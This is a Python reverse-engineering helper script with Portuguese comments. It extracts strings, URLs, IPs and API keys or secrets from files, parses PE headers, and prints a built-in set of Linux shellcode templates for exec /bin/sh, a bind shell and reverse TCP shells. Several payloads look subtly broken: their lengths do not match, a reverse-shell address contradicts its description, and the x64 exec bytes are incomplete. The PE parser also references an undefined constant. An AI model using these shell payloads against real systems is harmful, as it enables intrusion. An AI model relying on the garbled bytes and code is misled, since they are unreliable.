#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Reverse Engineering Helper — Ferramentas para análise de binários
Extract strings, analyze PE headers, generate shellcode templates
"""

import sys
import json
import re
import struct
import hashlib
import os
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from pathlib import Path


class REHelper:
    """Ferramentas de engenharia reversa"""
    
    # Common shellcode templates
    SHELLCODE_TEMPLATES = {
        'x86_exec': {
            'name': 'x86 Exec (/bin/sh)',
            'description': 'Execute /bin/sh (x86 Linux)',
            'shellcode': (
                b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1"
                b"\x31\xd2\xb0\x0b\xcd\x80"
            ),
            'length': 24,
            'flags': ['no_null'],
        },
        'x86_bind_tcp': {
            'name': 'x86 Bind TCP (4444)',
            'description': 'Bind TCP shell on port 4444 (x86 Linux)',
            'shellcode': (
                b"\x31\xdb\xb0\x66\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80"
                b"\x96\x6a\x66\x58\x52\x6a\x01\x53\x89\xe1\xcd\x80"
                b"\x96\x6a\x3f\x58\x31\xdb\xcd\x80\x49\x6a\x3f\x58"
                b"\x31\xdb\xcd\x80\x49\x6a\x25\x58\xcd\x80\x31\xc0"
                b"\x50\x68\x7f\x00\x00\x01\x68\x00\x5c\xe4\x30\x89"
                b"\xe3\x50\x50\x53\x89\xe1\x6a\x03\x89\xe1\xcd\x80"
                b"\x31\xc0\x50\x68\x6e\x22\x08\x30\x68\x80\x04\x00"
                b"\x30\x89\xe2\x52\x52\x53\x89\xe1\x6a\x03\x89\xe1"
                b"\xcd\x80\x31\xc0\x50\x52\x53\x89\xe1\xcd\x80"
            ),
            'length': 88,
        },
        'x86_reverse_tcp': {
            'name': 'x86 Reverse TCP',
            'description': 'Reverse TCP shell to 127.0.0.1:4444 (x86 Linux)',
            'shellcode': (
                b"\x31\xc0\x50\x68\xc0\xa8\x00\x01\x68\x00\x11\x55\x66"
                b"\x89\xe6\x6a\x02\x50\x56\x53\x89\xe1\xb0\x66\xcd\x80"
                b"\x93\x50\x53\x89\xe1\xb0\x3f\xcd\x80\x49\x80\xf9\x03"
                b"\x7e\xf0\xb0\x03\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73"
                b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
                b"\x0b\xcd\x80"
            ),
            'length': 50,
        },
        'x64_exec': {
            'name': 'x64 Exec (/bin/sh)',
            'description': 'Execute /bin/sh (x86_64 Linux)',
            'shellcode': (
                b"\x48\x31\xd2\xb0\x3b\x52\x48\x89\xe6\x6a\x00\x56\x5e"
                b"\x0f\x05"
            ),
            'length': 16,
        },
        'x64_reverse_tcp': {
            'name': 'x64 Reverse TCP',
            'description': 'Reverse TCP shell to 127.0.0.1:4444 (x86_64 Linux)',
            'shellcode': (
                b"\x48\x31\xd2\x48\xbb\x01\x00\x00\xc0\xa8\x00\x01\x48"
                b"\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xf6\x48\xbb\x01"
                b"\x11\x55\x66\x48\xc1\xeb\x10\x56\x53\x48\x89\xe1\x48"
                b"\xc7\xc0\x29\x00\x00\x00\x0f\x05\x48\x97\x48\xbb\x01"
                b"\x00\x00\x00\x00\x00\x00\x00\x53\x48\x89\xe7\x6a\x01"
                b"\x5e\x48\x89\xe6\x48\x31\xf6\xb0\x2a\x0f\x05\x48\x31"
                b"\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89"
                b"\xe7\x52\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05"
            ),
            'length': 95,
        },
    }
    
    # PE Analysis constants
    PE_SIGNATURE = b'MZ'
    DOS_HEADER_SIZE = 64
    PE_OFFSET_OFFSET = 60
    
    def __init__(self):
        self.history: List[Dict] = []
    
    # ================================================================
    # STRING EXTRACTION
    # ================================================================
    
    def extract_strings(self, file_path: str, min_length: int = 4) -> List[str]:
        """Extrai strings imprimíveis de um arquivo"""
        strings = []
        
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            
            # Extrair ASCII strings
            ascii_pattern = rb'[\x20-\x7e]{%d,}' % min_length
            ascii_strings = re.findall(ascii_pattern, content)
            strings.extend([s.decode('ascii', errors='ignore') for s in ascii_strings])
            
            # Extrair Unicode strings (UTF-16 LE)
            unicode_pattern = rb'(?:[\x20-\x7e]\x00){%d,}' % (min_length // 2)
            unicode_strings = re.findall(unicode_pattern, content)
            for s in unicode_strings:
                try:
                    decoded = s.decode('utf-16-le', errors='ignore')
                    if decoded.strip():
                        strings.append(decoded)
                except:
                    pass
            
            return list(set(strings))
            
        except Exception as e:
            return [f'[ERROR] {e}']
    
    def extract_urls(self, file_path: str) -> List[str]:
        """Extrai URLs de um arquivo"""
        strings = self.extract_strings(file_path)
        url_pattern = r'https?://[^\s\"\'<>]+'
        urls = []
        for s in strings:
            matches = re.findall(url_pattern, s)
            urls.extend(matches)
        return list(set(urls))
    
    def extract_ips(self, file_path: str) -> List[str]:
        """Extrai endereços IP de um arquivo"""
        strings = self.extract_strings(file_path)
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        ips = []
        for s in strings:
            matches = re.findall(ip_pattern, s)
            ips.extend(matches)
        return list(set(ips))
    
    def extract_keys(self, file_path: str) -> List[str]:
        """Extrai chaves/API keys de um arquivo"""
        strings = self.extract_strings(file_path)
        key_patterns = [
            r'(?i)(?:api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})',
            r'(?i)(?:secret|password|passwd|pwd)\s*[:=]\s*["\']?([^\s\'"]{8,})',
            r'(?i)(?:aws_|amazon_)?access[_-]?key[_-]?id\s*[:=]\s*["\']?([A-Z0-9]{20})',
            r'AKIA[A-Z0-9]{16}',
            r'(?:sk-|sk_live_|sk_test_)[A-Za-z0-9]{20,}',
            r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
        ]
        
        keys = []
        for pattern in key_patterns:
            for s in strings:
                matches = re.findall(pattern, s)
                keys.extend(matches)
        
        return list(set(keys))
    
    # ================================================================
    # PE ANALYSIS
    # ================================================================
    
    def analyze_pe(self, file_path: str) -> Dict:
        """Analisa headers PE (exe/dll)"""
        result = {
            'file': file_path,
            'timestamp': datetime.now().isoformat(),
            'pe_info': {},
            'sections': [],
            'imports': [],
            'exports': [],
        }
        
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Verificar MZ signature
            if data[:2] != b'MZ':
                result['error'] = 'Not a PE file (no MZ signature)'
                return result
            
            # Ler offset do PE
            pe_offset = struct.unpack('<I', data[PE_OFFSET_OFFSET:PE_OFFSET_OFFSET+4])[0]
            
            # Verificar PE signature
            if data[pe_offset:pe_offset+4] != b'PE\x00\x00':
                result['error'] = 'Invalid PE signature'
                return result
            
            # Parse COFF header
            coff_offset = pe_offset + 4
            machine = struct.unpack('<H', data[coff_offset:coff_offset+2])[0]
            num_sections = struct.unpack('<H', data[coff_offset+2:coff_offset+4])[0]
            timestamp = struct.unpack('<I', data[coff_offset+4:coff_offset+8])[0]
            symbol_table_offset = struct.unpack('<I', data[coff_offset+8:coff_offset+12])[0]
            symbol_count = struct.unpack('<I', data[coff_offset+12:coff_offset+16])[0]
            optional_header_size = struct.unpack('<H', data[coff_offset+16:coff_offset+18])[0]
            characteristics = struct.unpack('<H', data[coff_offset+18:coff_offset+20])[0]
            
            result['pe_info'] = {
                'machine': machine,
                'num_sections': num_sections,
                'timestamp': datetime.fromtimestamp(timestamp).isoformat() if timestamp else 'N/A',
                'optional_header_size': optional_header_size,
                'characteristics': characteristics,
            }
            
            # Machine types
            machine_types = {
                0x14c: 'x86 (i386)',
                0x8664: 'x64',
                0x1c0: 'ARM',
                0xaa64: 'ARM64',
            }
            result['pe_info']['machine_type'] = machine_types.get(machine, f'0x{machine:04x}')
            
            # Parse sections
            section_offset = coff_offset + 20
            for i in range(min(num_sections, 30)):  # Limitar a 30 seções
                section_name = data[section_offset:section_offset+8].rstrip(b'\x00').decode('ascii', errors='replace')
                virtual_size = struct.unpack('<I', data[section_offset+8:section_offset+12])[0]
                virtual_address = struct.unpack('<I', data[section_offset+12:section_offset+16])[0]
                raw_size = struct.unpack('<I', data[section_offset+16:section_offset+20])[0]
                raw_offset = struct.unpack('<I', data[section_offset+20:section_offset+24])[0]
                characteristics = struct.unpack('<I', data[section_offset+24:section_offset+28])[0]
                
                # Decodificar características
                chars = []
                if characteristics & 0x20000000: chars.append('contains_code')
                if characteristics & 0x40000000: chars.append('contains_init_data')
                if characteristics & 0x80000000: chars.append('contains_uninit_data')
                if characteristics & 0x02000000: chars.append('readable')
                if characteristics & 0x04000000: chars.append('writable')
                if characteristics & 0x08000000: chars.append('executable')
                
                result['sections'].append({
                    'name': section_name,
                    'virtual_size': virtual_size,
                    'virtual_address': hex(virtual_address),
                    'raw_size': raw_size,
                    'raw_offset': hex(raw_offset),
                    'characteristics': chars,
                })
                
                section_offset += 40
            
            # Extrair strings das seções de código
            result['strings'] = self.extract_strings(file_path)
            result['urls'] = self.extract_urls(file_path)
            result['ips'] = self.extract_ips(file_path)
            result['keys'] = self.extract_keys(file_path)
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    # ================================================================
    # SHELLCODE HELPERS
    # ================================================================
    
    def get_shellcode(self, template_name: str) -> Dict:
        """Retorna shellcode de um template"""
        template = self.SHELLCODE_TEMPLATES.get(template_name)
        if not template:
            return {'error': f'Template "{template_name}" not found'}
        
        return {
            'name': template['name'],
            'description': template['description'],
            'shellcode_hex': template['shellcode'].hex(),
            'shellcode_c': ', '.join(f'0x{b:02x}' for b in template['shellcode']),
            'length': template['length'],
            'flags': template.get('flags', []),
        }
    
    def list_shellcodes(self) -> Dict:
        """Lista todos os shellcodes disponíveis"""
        return {
            'templates': list(self.SHELLCODE_TEMPLATES.keys()),
            'count': len(self.SHELLCODE_TEMPLATES),
        }
    
    # ================================================================
    # CRC/ hashes
    # ================================================================
    
    def calculate_hashes(self, file_path: str) -> Dict:
        """Calcula hashes de um arquivo"""
        result = {'file': file_path}
        
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            
            result['md5'] = hashlib.md5(content).hexdigest()
            result['sha1'] = hashlib.sha1(content).hexdigest()
            result['sha256'] = hashlib.sha256(content).hexdigest()
            result['size'] = len(content)
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    # ================================================================
    # EXPORT
    # ================================================================
    
    def export_analysis(self, analysis: Dict, output_path: str) -> str:
        """Exporta análise para JSON"""
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(analysis, f, indent=2, ensure_ascii=False, default=str)
        return output_path


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Reverse Engineering Helper')
    parser.add_argument('command', choices=['strings', 'pe', 'shellcode', 'hash', 'urls', 'keys', 'ips'],
                       help='Comando a executar')
    parser.add_argument('target', nargs='?', help='Arquivo ou termo de busca')
    parser.add_argument('--min-length', '-m', type=int, default=4, help='Tamanho mínimo das strings')
    parser.add_argument('--output', '-o', help='Arquivo de saída')
    parser.add_argument('--list', '-l', action='store_true', help='Listar opções')
    
    args = parser.parse_args()
    
    helper = REHelper()
    
    if args.command == 'strings':
        if not args.target:
            print("[ERROR] Provide file path")
            return
        strings = helper.extract_strings(args.target, args.min_length)
        print(f"\n[Strings from {args.target}]")
        for s in strings[:50]:  # Limitar output
            print(f"  {s}")
        if len(strings) > 50:
            print(f"  ... and {len(strings) - 50} more")
        
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write('\n'.join(strings))
            print(f"\n[SAVE] Saved to {args.output}")
    
    elif args.command == 'pe':
        if not args.target:
            print("[ERROR] Provide PE file path")
            return
        analysis = helper.analyze_pe(args.target)
        print(json.dumps(analysis, indent=2, default=str))
        
        if args.output:
            path = helper.export_analysis(analysis, args.output)
            print(f"[SAVE] Saved to {path}")
    
    elif args.command == 'shellcode':
        if args.list:
            result = helper.list_shellcodes()
            print(f"\n[Available Shellcodes]")
            for name in result['templates']:
                template = helper.SHELLCODE_TEMPLATES[name]
                print(f"  - {name}: {template['description']}")
            print(f"\n  Total: {result['count']}")
        elif args.target:
            result = helper.get_shellcode(args.target)
            if 'error' in result:
                print(f"[ERROR] {result['error']}")
            else:
                print(f"\n[{result['name']}]")
                print(f"Description: {result['description']}")
                print(f"Length: {result['length']} bytes")
                print(f"\nC format:")
                print(f"  char shellcode[] = \"{result['shellcode_c']}\";")
                print(f"\nHex:")
                print(f"  {result['shellcode_hex']}")
        else:
            parser.print_help()
    
    elif args.command == 'hash':
        if not args.target:
            print("[ERROR] Provide file path")
            return
        result = helper.calculate_hashes(args.target)
        print(json.dumps(result, indent=2))
    
    elif args.command == 'urls':
        if not args.target:
            print("[ERROR] Provide file path")
            return
        urls = helper.extract_urls(args.target)
        print(f"\n[URLs from {args.target}]")
        for u in urls:
            print(f"  {u}")
    
    elif args.command == 'keys':
        if not args.target:
            print("[ERROR] Provide file path")
            return
        keys = helper.extract_keys(args.target)
        print(f"\n[Keys/API Keys from {args.target}]")
        for k in keys:
            print(f"  {k[:50]}...")
    
    elif args.command == 'ips':
        if not args.target:
            print("[ERROR] Provide file path")
            return
        ips = helper.extract_ips(args.target)
        print(f"\n[IPs from {args.target}]")
        for ip in ips:
            print(f"  {ip}")


if __name__ == "__main__":
    main()
